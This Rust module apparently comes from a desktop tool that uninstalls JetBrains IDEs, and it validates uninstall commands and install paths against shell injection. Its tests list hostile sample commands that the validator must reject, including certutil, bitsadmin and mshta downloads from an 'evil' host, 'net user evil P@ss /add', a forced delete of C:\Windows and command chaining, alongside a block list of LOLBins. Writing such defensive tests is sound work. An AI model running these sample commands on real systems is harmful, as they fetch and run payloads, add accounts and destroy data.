use super::super::{logger, process_manager, types::JetBrainsInstallation};
use std::collections::HashMap;
use tauri::AppHandle;

/// `cmd /c` 会把下列字符解释为命令链/重定向/变量展开。
/// 卸载串来自注册表或前端 IPC，必须在执行前排除这些元字符。
const CMD_METACHARS: &[char] = &['&', '|', '<', '>', '^', '%', '`', '\n', '\r', '\0'];

/// 禁止作为卸载串第一段出现的解释器（防止卸载串退化为任意命令执行）
const BANNED_INTERPRETERS: &[&str] = &[
    "cmd.exe",
    "cmd /c",
    "cmd.exe /c",
    "powershell",
    "pwsh",
    "wscript",
    "cscript",
    "mshta",
    "rundll32",
    "regsvr32",
    "bitsadmin",
    "certutil",
    "schtasks",
    "reg ",
    "net ",
    "sc ",
    "wmic",
];

/// 同上，但按「可执行文件名（basename）」匹配。
///
/// 上面的 `starts_with` 只看整串前缀，`"C:\Windows\System32\cmd.exe" /c whoami`
/// 这种带全路径的写法会绕过检查；这里再按最后一段路径比对一次。
/// `msiexec` 刻意不在名单内——MSI 产品卸载必须走它。
const BANNED_EXE_NAMES: &[&str] = &[
    "cmd",
    "cmd.exe",
    "powershell",
    "powershell.exe",
    "powershell_ise",
    "powershell_ise.exe",
    "pwsh",
    "pwsh.exe",
    "wscript",
    "wscript.exe",
    "cscript",
    "cscript.exe",
    "mshta",
    "mshta.exe",
    "rundll32",
    "rundll32.exe",
    "regsvr32",
    "regsvr32.exe",
    "bitsadmin",
    "bitsadmin.exe",
    "certutil",
    "certutil.exe",
    "schtasks",
    "schtasks.exe",
    "reg",
    "reg.exe",
    "net",
    "net.exe",
    "net1",
    "net1.exe",
    "sc",
    "sc.exe",
    "wmic",
    "wmic.exe",
];


/// 校验卸载命令可安全交给 `cmd /c` 执行。
///
/// 通过 argv 数组执行的程序不经过 shell，但这里最终经
/// `Start-Process cmd.exe -ArgumentList "/c", $cmd` 走 cmd 解释器，
/// 因此 `&`、`|`、`>` 等会变成命令链/管道/重定向 —— 属于任意命令执行面。
pub fn validate_uninstall_command(cmd: &str) -> Result<String, String> {
    let trimmed = cmd.trim();
    if trimmed.is_empty() {
        return Err("卸载命令为空".to_string());
    }
    if trimmed.len() > 2048 {
        return Err(format!("卸载命令过长（{} 字节）", trimmed.len()));
    }
    for (i, c) in trimmed.char_indices() {
        if CMD_METACHARS.contains(&c) {
            return Err(format!(
                "卸载命令含 cmd 元字符 {:?}（位置 {}），已拒绝执行",
                c, i
            ));
        }
    }
    let lower = trimmed.to_lowercase();
    // 只检查第一段（可执行文件），避免误伤参数里的正常字样
    let first_token = lower
        .split(|c: char| c.is_whitespace())
        .next()
        .unwrap_or_default()
        .trim_matches('"');
    for banned in BANNED_INTERPRETERS {
        if first_token.starts_with(banned.trim()) || lower.starts_with(banned) {
            return Err(format!(
                "卸载命令指向解释器 {}，已拒绝执行",
                banned
            ));
        }
    }
    // 按 basename 再查一次：`"C:\Windows\System32\cmd.exe" /c whoami` 的前缀是
    // `c:\windows\...`，上面的 starts_with 全都匹配不到。
    let exe_name = first_token
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or(first_token)
        .trim_matches('"');
    for banned in BANNED_EXE_NAMES {
        if exe_name == *banned {
            return Err(format!(
                "卸载命令指向受限可执行文件 {}，已拒绝执行",
                exe_name
            ));
        }
    }
    Ok(trimmed.to_string())
}

/// 校验 IDE 安装目录可用于"按目录终止进程"。
///
/// 原实现把 `$dir` 直接拼进 `-like "$dir\*"`：`install_location="C:\"`
/// 会变成 `-like "C:\\*"` 从而杀死**所有**进程；`*?[` 还会被当通配符。
/// 这里要求目录真实存在、层级足够，且路径中含 JetBrains 产品标识。
fn validate_install_location(raw: &str) -> Result<String, String> {
    let trimmed = raw.trim();
    if trimmed.is_empty() {
        return Err("安装目录为空".to_string());
    }
    if trimmed.contains('*') || trimmed.contains('?') || trimmed.contains('[') {
        return Err("安装目录含通配符".to_string());
    }
    if trimmed.contains('\0') || trimmed.contains('\n') || trimmed.contains('\r') {
        return Err("安装目录含非法控制字符".to_string());
    }
    let canonical = std::path::Path::new(trimmed)
        .canonicalize()
        .map_err(|e| format!("安装目录无法解析: {}", e))?;
    if !canonical.is_dir() {
        return Err("安装目录不存在".to_string());
    }
    if canonical.components().count() < 3 {
        return Err(format!("安装目录层级过浅: {}", canonical.display()));
    }
    let lowered = canonical.to_string_lossy().to_lowercase();
    if !(lowered.contains("jetbrains")
        || lowered.contains("intellij")
        || lowered.contains("pycharm")
        || lowered.contains("webstorm")
        || lowered.contains("goland")
        || lowered.contains("clion")
        || lowered.contains("datagrip")
        || lowered.contains("phpstorm")
        || lowered.contains("rubymine")
        || lowered.contains("rustrover")
        || lowered.contains("rider")
        || lowered.contains("appcode"))
    {
        return Err(format!("安装目录不含 JetBrains 产品标识: {}", canonical.display()));
    }
    // canonicalize() 在 Windows 上返回 `\\?\C:\...` 扩展长度路径；
    // 下游要拿它和 Win32_Process 的 ExecutablePath（`C:\...`）做前缀比较，
    // 必须去掉 `\\?\` 才能匹配上。
    Ok(strip_extended_prefix(&canonical.to_string_lossy()))
}

/// 去掉 `canonicalize()` 产生的 NT 扩展长度前缀（`\\?\` / `\\?\UNC\`）。
fn strip_extended_prefix(p: &str) -> String {
    if let Some(rest) = p.strip_prefix(r"\\?\UNC\") {
        format!(r"\\{}", rest)
    } else if let Some(rest) = p.strip_prefix(r"\\?\") {
        rest.to_string()
    } else {
        p.to_string()
    }
}

/// 终止该 IDE 的运行进程（按可执行文件路径精准匹配，避免误杀其他 IDE）
async fn kill_ide_processes(app_handle: &AppHandle, install_location: &str) {
    let dir = match validate_install_location(install_location) {
        Ok(d) => d,
        Err(e) => {
            logger::warn(
                app_handle,
                &format!("跳过终止 IDE 进程（{}）: {}", install_location, e),
            );
            return;
        }
    };
    let mut env_vars = HashMap::new();
    env_vars.insert(
        "IDE_DIR".to_string(),
        dir.trim_end_matches('\\').to_string(),
    );

    // 用字符串前缀比较代替 -like：避免 `$dir` 中的 `*?[` 被当作通配符
    let script = r#"
        $dir = $env:IDE_DIR
        if (-not $dir) { Write-Output 0; exit 0 }
        $dirNorm = $dir.TrimEnd('\')
        $count = 0
        Get-CimInstance Win32_Process -ErrorAction SilentlyContinue |
            Where-Object {
                $_.ExecutablePath -and
                $_.ExecutablePath.Length -gt $dirNorm.Length -and
                $_.ExecutablePath.Substring(0, $dirNorm.Length) -ieq $dirNorm -and
                $_.ExecutablePath[$dirNorm.Length] -eq '\'
            } |
            ForEach-Object {
                try { Stop-Process -Id $_.ProcessId -Force -ErrorAction Stop; $count++ } catch {}
            }
        Write-Output $count
    "#;

    match process_manager::execute_powershell_env(script, &env_vars, 60).await {
        Ok(out) => {
            let n: usize = out.stdout.trim().lines().last().and_then(|l| l.trim().parse().ok()).unwrap_or(0);
            if n > 0 {
                logger::info(app_handle, &format!("已终止 {} 个 IDE 进程", n));
            }
        }
        Err(e) => logger::warn(app_handle, &format!("终止 IDE 进程异常: {}", e)),
    }
}

/// 卸载选中的 JetBrains 产品。
///
/// 优先使用 QuietUninstallString（静默）；退而求其次用 UninstallString 并尝试加静默参数。
/// MSI 安装器使用 msiexec /x {ProductCode} /quiet。
pub async fn uninstall_jetbrains(
    app_handle: AppHandle,
    installation: JetBrainsInstallation,
) -> Result<(), String> {
    logger::info(
        &app_handle,
        &format!("开始卸载 {}", installation.product_name),
    );

    // 1. 先终止该 IDE 进程，释放文件占用
    kill_ide_processes(&app_handle, &installation.install_location).await;

    // 2. 执行卸载命令
    let uninstall_cmd = if !installation.quiet_uninstall_string.is_empty() {
        logger::info(&app_handle, "使用 QuietUninstallString 静默卸载");
        installation.quiet_uninstall_string.clone()
    } else if !installation.uninstall_string.is_empty() {
        logger::info(&app_handle, "使用 UninstallString（尝试加静默参数）");
        let raw = installation.uninstall_string.clone();
        // MSI 安装器：MsiExec.exe /I{...} 或 /X{...}
        if raw.to_lowercase().contains("msiexec") {
            // 提取产品 ID 并用 /x 静默卸载
            if let Some(brace_start) = raw.find('{') {
                if let Some(brace_end) = raw[brace_start..].find('}') {
                    let product_id = &raw[brace_start..=brace_start + brace_end];
                    format!("msiexec.exe /x {} /quiet /norestart", product_id)
                } else {
                    raw
                }
            } else {
                raw
            }
        } else {
            // .exe 安装器：追加 /S 静默参数（JetBrains NSIS 卸载器支持 /S）
            format!("{} /S", raw.trim_end_matches(' '))
        }
    } else {
        logger::warn(
            &app_handle,
            &format!("{} 无卸载字符串，跳过卸载器调用（仅清理残留）", installation.product_name),
        );
        return Ok(());
    };

    // 通过 cmd /c 执行卸载命令（处理含空格路径和引号）。
    // 卸载串来自注册表/前端，必须先排除 cmd 元字符与解释器，否则
    // `&`/`|`/`>` 会让它退化为任意命令执行（本进程带管理员令牌）。
    let uninstall_cmd = match validate_uninstall_command(&uninstall_cmd) {
        Ok(cmd) => cmd,
        Err(e) => {
            let msg = format!("{} 卸载命令不安全，已跳过卸载器调用（仍会清理残留）: {}", installation.product_name, e);
            logger::warn(&app_handle, &msg);
            return Ok(());
        }
    };

    let mut env_vars = HashMap::new();
    env_vars.insert("UNINSTALL_CMD".to_string(), uninstall_cmd);
    let script = r#"
        $cmd = $env:UNINSTALL_CMD
        # 以分离进程启动卸载器并等待完成
        Start-Process cmd.exe -ArgumentList "/c", $cmd -Wait -NoNewWindow
    "#;

    match process_manager::execute_powershell_env(script, &env_vars, 600).await {
        Ok(out) => {
            if out.exit_code == 0 {
                logger::info(&app_handle, "卸载器执行完成");
            } else {
                logger::warn(
                    &app_handle,
                    &format!("卸载器返回非零退出码: {}（stderr: {}）", out.exit_code, out.stderr.trim()),
                );
            }
        }
        Err(e) => {
            logger::warn(&app_handle, &format!("卸载器执行异常: {}（继续清理残留）", e));
        }
    }

    logger::info(&app_handle, &format!("{} 卸载流程完成", installation.product_name));
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    // ---------- validate_uninstall_command ----------

    #[test]
    fn uninstall_command_accepts_normal_uninstaller() {
        let ok = validate_uninstall_command(
            r"C:\Program Files\JetBrains\Toolbox\uninstall.exe /S",
        );
        assert!(ok.is_ok(), "{:?}", ok);
    }

    #[test]
    fn uninstall_command_accepts_quoted_path_with_spaces() {
        let ok = validate_uninstall_command(
            r#""C:\Program Files\JetBrains\IntelliJ IDEA 2024.1\uninstall.exe" /S"#,
        );
        assert!(ok.is_ok(), "{:?}", ok);
    }

    #[test]
    fn uninstall_command_accepts_msiexec() {
        let ok = validate_uninstall_command(
            "msiexec.exe /x {0A1B2C3D-0000-0000-0000-000000000000} /quiet /norestart",
        );
        assert!(ok.is_ok(), "{:?}", ok);
    }

    #[test]
    fn uninstall_command_trims_whitespace() {
        let ok = validate_uninstall_command("  uninstall.exe /S \n").unwrap();
        assert_eq!(ok, "uninstall.exe /S");
    }

    #[test]
    fn uninstall_command_rejects_empty() {
        let err = validate_uninstall_command("   ").unwrap_err();
        assert!(err.contains("为空"), "{}", err);
    }

    #[test]
    fn uninstall_command_rejects_too_long() {
        let long = "a".repeat(2049);
        let err = validate_uninstall_command(&long).unwrap_err();
        assert!(err.contains("过长"), "{}", err);
    }

    #[test]
    fn uninstall_command_rejects_every_cmd_metachar() {
        for c in CMD_METACHARS {
            let payload = format!("uninstall.exe{}/S", c);
            match validate_uninstall_command(&payload) {
                Ok(v) => panic!("元字符 {:?} 未被拒绝: {:?}", c, v),
                Err(err) => assert!(err.contains("元字符"), "{}", err),
            }
        }
    }

    /// 断言卸载串被拒绝，且错误信息命中期望的关键字。
    fn assert_rejected(payload: &str, needle: &str) {
        match validate_uninstall_command(payload) {
            Ok(v) => panic!("{:?} 未被拒绝: {:?}", payload, v),
            Err(err) => assert!(err.contains(needle), "{:?} => {}", payload, err),
        }
    }

    #[test]
    fn uninstall_command_rejects_command_chaining_examples() {
        for payload in [
            "uninstall.exe & whoami",
            "uninstall.exe | whoami",
            "uninstall.exe > C:\\Windows\\System32\\evil.dll",
            "uninstall.exe < nul",
            "uninstall.exe ^& whoami",
            "uninstall.exe %PATH%",
            "uninstall.exe `whoami`",
        ] {
            assert_rejected(payload, "元字符");
        }
    }

    #[test]
    fn uninstall_command_rejects_shell_interpreters() {
        for payload in [
            "cmd.exe /c whoami",
            "cmd /c del /f /q C:\\Windows",
            "powershell -EncodedCommand AAAA",
            "pwsh -c Get-Process",
            "wscript evil.vbs",
            "cscript evil.vbs",
            "mshta http://evil/x.hta",
            "rundll32 shell32.dll,Control_RunDLL",
            "regsvr32 /s evil.scr",
            "bitsadmin /transfer x http://evil p.exe",
            "certutil -urlcache -f http://evil p.exe",
            "schtasks /create /tn x /tr evil",
            "reg add HKLM\\SOFTWARE\\Evil /v X /d Y /f",
            "net user evil P@ss /add",
            "sc stop MySQL80",
            "wmic process call create evil",
        ] {
            match validate_uninstall_command(payload) {
                Ok(v) => panic!("{:?} 未被拒绝: {:?}", payload, v),
                Err(err) => assert!(
                    err.contains("解释器") || err.contains("受限可执行文件"),
                    "{:?} => {}",
                    payload,
                    err
                ),
            }
        }
    }

    #[test]
    fn uninstall_command_rejects_absolute_path_to_banned_interpreter() {
        // 这是前缀检查的绕过面：整串前缀是 `c:\windows\...`，
        // BANNED_INTERPRETERS 一条都匹配不到，必须靠 basename 兜住。
        for payload in [
            r#""C:\Windows\System32\cmd.exe" /c whoami"#,
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc AAAA",
            r"C:\Windows\System32\certutil.exe -urlcache -f http://evil p.exe",
            r"C:\Windows\System32\rundll32.exe shell32.dll,Control_RunDLL",
        ] {
            assert_rejected(payload, "受限可执行文件");
        }
    }

    // ---------- validate_install_location ----------

    fn temp_dir_with(name: &str) -> std::path::PathBuf {
        let base = std::env::temp_dir().join(format!(
            "dev_tools_test_{}_{}",
            std::process::id(),
            name
        ));
        std::fs::create_dir_all(&base).expect("创建临时目录失败");
        base
    }

    #[test]
    fn install_location_accepts_real_product_dir() {
        let dir = temp_dir_with("intellij_idea_2024.1");
        let canonical =
            validate_install_location(&dir.to_string_lossy()).unwrap_or_else(|e| panic!("{}", e));
        assert!(
            !canonical.starts_with(r"\\?\"),
            "不应保留扩展长度前缀: {}",
            canonical
        );
        let expected = std::fs::canonicalize(&dir).expect("canonicalize 失败");
        let expected = strip_extended_prefix(&expected.to_string_lossy());
        assert_eq!(canonical, expected);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn install_location_rejects_empty() {
        let err = validate_install_location("   ").unwrap_err();
        assert!(err.contains("为空"), "{}", err);
    }

    #[test]
    fn install_location_rejects_wildcards() {
        for payload in ["C:\\JetBrains\\*", "C:\\JetBrains\\Ide?a", "C:\\JetBrains\\[x]"] {
            let err = validate_install_location(payload).unwrap_err();
            assert!(err.contains("通配符"), "{}", err);
        }
    }

    #[test]
    fn install_location_rejects_control_chars() {
        for payload in [
            "C:\\JetBrains\0\\x",
            "C:\\JetBrains\n\\x",
            "C:\\JetBrains\r\\x",
        ] {
            let err = validate_install_location(payload).unwrap_err();
            assert!(err.contains("控制字符"), "{}", err);
        }
    }

    #[test]
    fn install_location_rejects_nonexistent_dir() {
        let err = validate_install_location(
            r"C:\Program Files\JetBrains\ThisDoesNotExist_9f3a",
        )
        .unwrap_err();
        assert!(err.contains("无法解析"), "{}", err);
    }

    #[test]
    fn install_location_rejects_shallow_root() {
        let err = validate_install_location("C:\\").unwrap_err();
        assert!(err.contains("层级过浅"), "{}", err);
    }

    #[test]
    fn install_location_rejects_dir_without_product_marker() {
        let dir = temp_dir_with("plain_dir");
        let err = validate_install_location(&dir.to_string_lossy()).unwrap_err();
        assert!(err.contains("不含 JetBrains 产品标识"), "{}", err);
        let _ = std::fs::remove_dir_all(&dir);
    }

    // ---------- strip_extended_prefix ----------

    #[test]
    fn strip_extended_prefix_handles_forms() {
        assert_eq!(strip_extended_prefix(r"\\?\C:\Windows"), r"C:\Windows");
        assert_eq!(
            strip_extended_prefix(r"\\?\UNC\server\share"),
            r"\\server\share"
        );
        assert_eq!(strip_extended_prefix(r"C:\Windows"), r"C:\Windows");
    }
}
